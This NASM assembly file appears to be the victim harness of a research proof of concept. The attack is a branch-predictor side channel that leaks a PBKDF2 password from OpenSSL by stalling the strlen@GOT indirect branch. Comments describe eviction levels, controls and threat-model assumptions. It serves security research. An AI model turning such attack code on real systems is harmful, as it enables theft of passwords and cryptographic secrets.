%include "../../nops.inc"

%define nthreads 1
%define repeat0  1             ; Number of repetitions of whole test. Default = 8
%define repeat1  100           ; Repeat count for loop around testcode. Default = no loop
%define repeat2  1             ; Repeat count for repeat macro around testcode. Default = 100
%define noptype  2

; use_spinlocks=1  -> the victim and the attacker take strict turns through the
;                     shared tokens. Required for the Peek-a-Walk discovery
;                     phase (get_higher_bits=1), where each setup_trigger call
;                     has to be matched by exactly one victim round.
; use_spinlocks=0  -> purely cooperative sched_yield handoff, no blocking.
;
; The two processes MUST be built with the same value: an attacker that never
; touches the tokens leaves a spinlocking victim parked forever, and vice versa.
%ifndef use_spinlocks
%define use_spinlocks 1
%endif

; Both handoff variants are padded to a fixed size so that flipping
; use_spinlocks does not change the victim's code size. libcrypto is linked
; after this object file, so ANY size change here rebases every OpenSSL address
; baked into attacker.ld -- padding is what lets the same attacker.ld serve
; both builds, and therefore what makes an A/B comparison of the two handoffs
; meaningful rather than a comparison of two different layouts.
%define ACQUIRE_BYTES 32
%define RELEASE_BYTES 24

; PBKDF2 iteration count the victim asks for. 10000 is OpenSSL's realistic
; value and the shipped default. The secret is written into the IBP at the
; strlen() call near the START of ossl_pkcs5_pbkdf2_hmac_ex, so the iterations
; are pure latency after the fact -- they decide how often the victim reaches
; the gadget, not whether the leak happens. Lowering this is a diagnostic for
; that latency, never a shipped configuration.
;
; `mov r8, imm` is the same 7-byte encoding for any value up to 2^31, so this
; does not change the victim's code size or rebase the OpenSSL image.
%ifndef pbkdf2_iters
%define pbkdf2_iters 10000
%endif

; How the victim leaves strlen@GOT before the stalled indirect branch. This sets
; the length of the speculation window, because the branch cannot resolve until
; that load returns.
;
;   0 = untouched         ~5 cy   (L1 hit)   -- measured: channel dead
;   1 = evict L1 set only ~15 cy  (L2 hit)   -- what an SMT-sibling attacker can do
;   3 = clflush           ~300 cy (DRAM)     -- shipped
;
; Level 1 is the one that matters for the threat model: L1D is VIPT, so its set
; index comes from bits 6-11 of the VIRTUAL address, which the attacker knows
; exactly (the victim is -no-pie). Evicting it needs no physical addresses and
; no eviction-set search -- just 12+ loads at the same page offset. If the
; channel survives level 1, a flusher pinned to the sibling core suffices and no
; victim cooperation is needed. If it only survives level 3, the attacker must
; reach DRAM, which means real L3 eviction-set construction.
; 0 is the shipped configuration and is NOT a knob: the victim does not flush
; its own GOT, and the attacker opens the window itself via got_flush_slices in
; attacker.nasm. It is the default here so that a bare `nasm` build, and the two
; run_p*.sh scripts (neither of which passes -Dgot_stall), produce the same
; victim binary find_target_addr.py builds. Levels 1-3 are kept below as the
; measured controls the no-flush result is argued against; nothing in the
; shipped pipeline selects them.
%ifndef got_stall
%define got_stall 0
%endif

; Whether the victim yields the core to the attacker. At use_spinlocks=0 this is
; the ONLY remaining scheduling cooperation: VICTIM_ACQUIRE and VICTIM_RELEASE
; each issue sched_yield(), ~158 times a second at pbkdf2_iters=10000. The
; attacker never yields -- it blocks in nanosleep -- so the interleaving is
; entirely the victim's doing, which is not something a real victim does.
;
; 0 removes both. Whether they are load-bearing is unclear: both processes are
; pinned to one core, and when the attacker's nanosleep expires the kernel
; preempts the victim to service the wakeup regardless. The yields may only make
; the handoff prompt rather than possible. Against that, sleep_ns=24ms sits on a
; sharply peaked hit-rate curve tuned against a yielding victim.
;
; Free to test: VICTIM_ACQUIRE/RELEASE already pad to ACQUIRE_BYTES/RELEASE_BYTES,
; so dropping the 7-byte sched_yield just adds 7 nops inside the same budget and
; the victim image does not move at all.
; 0 is the shipped configuration and is NOT a knob -- see find_target_addr.py.
; Defaulted to 0 so a bare `nasm` build matches what the driver and
; run_p0_infinite.sh produce; 1 restores the cooperative victim.
%ifndef victim_yield
%define victim_yield 0
%endif

; Page offset of the cache line holding strlen@GOT, i.e. which L1D set to evict
; for got_stall=1. MUST come from the built binary: the GOT slot moves whenever
; the victim image changes size, including as a result of adding the eviction
; code itself. compile_victim() resolves it by objdump and passes -D, so this
; default only applies to a hand-build; %ifndef is load-bearing, since a plain
; %define would silently override the -D and evict the wrong set.
%ifndef got_line_offset
%define got_line_offset 0xf80
%endif

%macro VICTIM_ACQUIRE 0
  %%start:
  %if use_spinlocks
    ; Wait for the reader to hand us the victim token before writing the IBP,
    ; so the two processes interleave deterministically (write, then measure).
acquire_spinlock_0_0:
    mov   eax, 1                      ; eax has 1
    mov   rbx, [PSharedMemory]
    xchg  eax, dword[rbx]             ; PSharedMemory has 1, eax has old value
    test  eax, eax
    jnz   acquire_spinlock_0_0        ; 0 => we took the lock, else keep spinning
  %elif victim_yield
    ; Give the reader a turn, then proceed regardless. Best-effort, no lock.
    SCHED_YIELD
  %endif
    times ACQUIRE_BYTES - ($ - %%start) nop
%endmacro

%macro VICTIM_RELEASE 0
    ; The fences keep the IBP write above ordered ahead of the handoff, so the
    ; reader cannot observe the release before the speculative write has
    ; retired out of the way.
    SERIALIZE
    mfence
  %%start:
  %if use_spinlocks
release_spinlock_1_0:
    mov rbx, [PSharedMemory2]         ; release attacker lock
    mov dword[rbx], 0                 ; store-release (not `dec`): idempotent,
                                      ; cannot underflow 0 -> 0xFFFFFFFF
  %elif victim_yield
    SCHED_YIELD
  %endif
    times RELEASE_BYTES - ($ - %%start) nop
%endmacro

%macro testinitc 0
    lea rax, [UserData]
    mov [UserDataPtr], rax

    lea rax, [UserDataPtr]
    mov [UserDataPtrPtr], rax

    lea rax, [UserDataPtrPtr]
    mov [UserDataPtrPtrPtr], rax

    ; Force lazy binding of strlen to resolve once, up front. The attack
    ; flushes this GOT slot every round to stall strlen@plt, so the slot must
    ; already hold the final libc address -- otherwise the first stall lands in
    ; the dynamic resolver instead of the speculation window we want.
    mov rdi, password
    call strlen

    mov rbx, [PSharedMemory]
    mov dword[rbx], 0

    mov rbx, [PSharedMemory2]
    mov dword[rbx], 1
%endmacro

%macro testcode 0               ; A multi-line macro executing any piece of test code.
    VICTIM_ACQUIRE

   ; Write into IBP here

    %rep 4
    ; Stall the indirect branch that carries the secret. strlen@plt is
    ; `jmp *strlen@GOT(%rip)`; with the GOT line flushed the jump cannot
    ; resolve for hundreds of cycles, so the core runs ahead on the IBP
    ; prediction for that branch. The attacker has trained that entry to
    ; pkey_fake_import, whose `call *(%rax)` then executes speculatively with
    ; rax = rdi = password -- writing *password (the secret) into the IBP.
    ; Direct analogue of `clflush [__gmpn_cpuvec]` in the GMP victim.
%if got_stall == 3
    clflush [rel strlen wrt ..got]
%elif got_stall == 1
    ; Evict ONLY L1D set 62, the set holding strlen@GOT. 24 loads at 4 KiB
    ; stride all land in that one set (12-way L1D, so 24 over-evicts); every
    ; other set, and all of L2/L3, is left alone. The GOT line drops to L2.
    ; No branches here, so the victim's PHR -- which the attacker mirrors with
    ; SHIFT_PHR/SET_PHR -- is unchanged.
    lea rax, [rel got_evict_buf]
    add rax, 4095
    and rax, -4096                      ; page-align
    add rax, got_line_offset            ; now aliases L1D set 62
    %assign got_ev_i 0
    %rep 24
      mov r11, [rax + got_ev_i * 4096]
      %assign got_ev_i got_ev_i + 1
    %endrep
%elif got_stall == 2
    ; TLB CONTROL for got_stall=1. Touches exactly the same 24 pages, so the
    ; dTLB pressure is identical -- but the stride is 4096+64, so consecutive
    ; loads land in CONSECUTIVE L1D sets instead of all hitting the GOT's set.
    ; Only the first load touches set got_line_offset>>6, which is not enough to
    ; evict a 12-way set.
    ;
    ;   got_stall=1 : 24 pages, all 24 loads in the GOT's set   (TLB + L1D)
    ;   got_stall=2 : 24 pages,  1 load  in the GOT's set       (TLB only)
    ;
    ; So if the signal survives at level 2, level 1 was working through the TLB
    ; -- evicting the GOT page's translation and forcing a page walk, worth
    ; hundreds of cycles -- not through the ~15-cycle L1D->L2 demotion the
    ; level-1 comment claims.
    lea rax, [rel got_evict_buf]
    add rax, 4095
    and rax, -4096
    add rax, got_line_offset
    %assign got_tlb_i 0
    %rep 24
      mov r11, [rax + got_tlb_i * (4096 + 64)]
      %assign got_tlb_i got_tlb_i + 1
    %endrep
%else
    ; got_stall=0. Leaves the line in L1: no stall, no window. Kept as the
    ; null control -- measured L18 = -7, i.e. no page walk happens at all.
    ; Drops the victim's self-flush, which is
    ; the weakest assumption in the threat model: a real victim would not flush
    ; its own GOT to open a speculation window. The attacker cannot flush it
    ; either -- .got is inside GNU_RELRO, written by the dynamic linker at
    ; startup, so it is a private COW page and the attacker's clflush lands on
    ; a different physical line. Dropping it asks whether the line goes cold on
    ; its own; if it does, the assumption was a convenience, not a requirement.
    ;
    ; 7 NOPs = the exact size of the clflush, so this variant alone leaves the
    ; image byte-identical. The other levels do shift it; objdump_and_verify
    ; repatches attacker.ld for that (find_target_addr.py:517).
    times 7 nop
%endif

    SERIALIZE_OPT

    call start_test_ibranch

    SERIALIZE_OPT
    %endrep

    SERIALIZE_OPT

    ; Hand the turn back to the reader.
    VICTIM_RELEASE

    %rep 512
     nop
    %endrep

%endmacro

%macro SERIALIZE_OPT 0
    mfence
    xor eax, eax
    cpuid
%endmacro

%macro SCHED_YIELD 0                ; give up the CPU: sched_yield() = syscall 24.
    mov eax, 24                     ; clobbers rcx/r11 (syscall) and rax (retval);
    syscall                         ; none are live across the loop back to acquire.
%endmacro

%macro SHIFT_PHR 2
    mov rax, %1
    jmp shift_phr_%+ %2
    align 1<<16
    %rep (1<<16)-64
     nop
    %endrep
    shift_phr_%+ %2:
    %rep 64-8
     nop
    %endrep
    dec rax
    cmp rax, 0
    jg shift_phr_%+ %2
%endmacro

%macro SET_PHR 2
    %assign i 0
    %rep %1
        cmp qword[UserData], 1
        je set_phr_eq_%+ %2_%+ i
        %rep 64
         nop
        %endrep
        set_phr_eq_%+ %2_%+ i:
        %rep 64
         nop
        %endrep
        %assign i i+1
    %endrep
%endmacro

%macro SET_PHR_EVEN 1
    cmp rdx, 1
    %rep 50
     nop
    %endrep
    je set_phr_even_%+ %1
    align 1<<6
    set_phr_even_%+ %1:
    %rep 77H
     nop
    %endrep
%endmacro

section .sec_test_ibranch exec
start_test_ibranch:

    ; Resolve the digest BEFORE seeding the PHR: EVP_sha256() runs a pile of
    ; branches of its own and would otherwise scramble the history that the
    ; attacker replays.
    call EVP_sha256
    mov r9, rax

    SHIFT_PHR 195, 0
    SET_PHR 50, 0
    SERIALIZE_OPT

    ; PKCS5_PBKDF2_HMAC(pass, passlen, salt, saltlen, iter, digest, keylen, out)
    ; passlen = -1 makes ossl_pkcs5_pbkdf2_hmac_ex call strlen(pass), which is
    ; the indirect branch we stall -- and it reaches it with rdi still pointing
    ; at the password.
    push out_key                  ; 8th arg: out
    push key_len                  ; 7th arg: keylen

    mov rdi, password
    mov rsi, -1
    mov rdx, salt
    mov rcx, salt_len
    mov r8, pbkdf2_iters

test_ibranch_pc:
    call PKCS5_PBKDF2_HMAC
    add rsp, 16
    %rep 512
     nop
    %endrep
    ret

; Scratch for got_stall=1. 24 ways x 4 KiB, plus a page so the base can be
; rounded up to an alignment nasm's section directive would not guarantee.
section .bss
got_evict_buf: resb 26 * 4160   ; covers both strides (4096 and 4096+64)
